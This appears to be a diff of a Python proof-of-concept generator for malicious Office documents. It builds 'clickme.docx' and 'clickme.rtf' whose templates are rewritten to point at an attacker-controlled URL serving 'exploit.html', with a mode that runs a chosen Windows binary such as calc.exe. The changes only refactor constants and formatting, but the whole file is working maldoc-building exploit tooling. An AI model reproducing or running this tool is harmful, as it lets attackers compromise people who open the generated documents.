@@ -6,44 +6,44 @@ import http.server
 import socketserver
 import base64
 
-const_src_path = "src"
-const_src_docx_path = f"{const_src_path}/clickme"
-const_rtf_payload = "XpayloadX"
-const_docx_name = "clickme.docx"
-const_rtf_name = "clickme.rtf"
-const_rtf_template_path = "src/rtf/clickme.rtf"
-
 # Helper function to zip whole dir
 # https://stackoverflow.com/questions/1855095/how-to-create-a-zip-archive-of-a-directory
+
+
 def zipdir(path, ziph):
     for root, dirs, files in os.walk(path):
         for file in files:
             os.utime(os.path.join(root, file), (1653895859, 1653895859))
-            ziph.write(os.path.join(root, file), 
+            ziph.write(os.path.join(root, file),
                        os.path.relpath(
-                            os.path.join(root, file), 
+                            os.path.join(root, file),
                             path
                        ))
 
+
 def generate_docx(param_payload_url):
-    with open(f"{const_src_path}/document.xml.rels.tpl", "r") as f:
+    const_docx_name = "clickme.docx"
+
+    with open("src/document.xml.rels.tpl", "r") as f:
         tmp = f.read()
 
     payload_rels = tmp.format(payload_url = param_payload_url)
 
-    if not os.path.exists(f"{const_src_docx_path}/word/_rels"):
-        os.makedirs(f"{const_src_docx_path}/word/_rels")
+    if not os.path.exists("src/clickme/word/_rels"):
+        os.makedirs("src/clickme/word/_rels")
 
-    with open(f"{const_src_docx_path}/word/_rels/document.xml.rels", "w") as f:
+    with open("src/clickme/word/_rels/document.xml.rels", "w") as f:
         f.write(payload_rels)
 
     with zipfile.ZipFile(const_docx_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
-        zipdir(const_src_docx_path, zipf)
+        zipdir("src/clickme", zipf)
 
     print(f"Generated {const_docx_name} in current directory")
 
 def generate_rtf(param_payload_url):
-    with open(const_rtf_template_path, "r") as f:
+    const_rtf_name = "clickme.rtf"
+
+    with open("src/rtf/clickme.rtf", "r") as f:
         tmp = f.read()
 
     payload_rtf = tmp.replace(const_rtf_payload, param_payload_url)
@@ -78,6 +78,7 @@ if __name__ == "__main__":
     args = parser.parse_args()
 
     payload_url = f"http://{args.url}:{args.port}/exploit.html"
+    const_rtf_payload = "XpayloadX"
 
     if args.mode == "binary" and args.binary is None:
         raise SystemExit("Binary mode requires a binary to be specified, e.g. -b '\\\\localhost\\c$\\Windows\\System32\\calc.exe'")
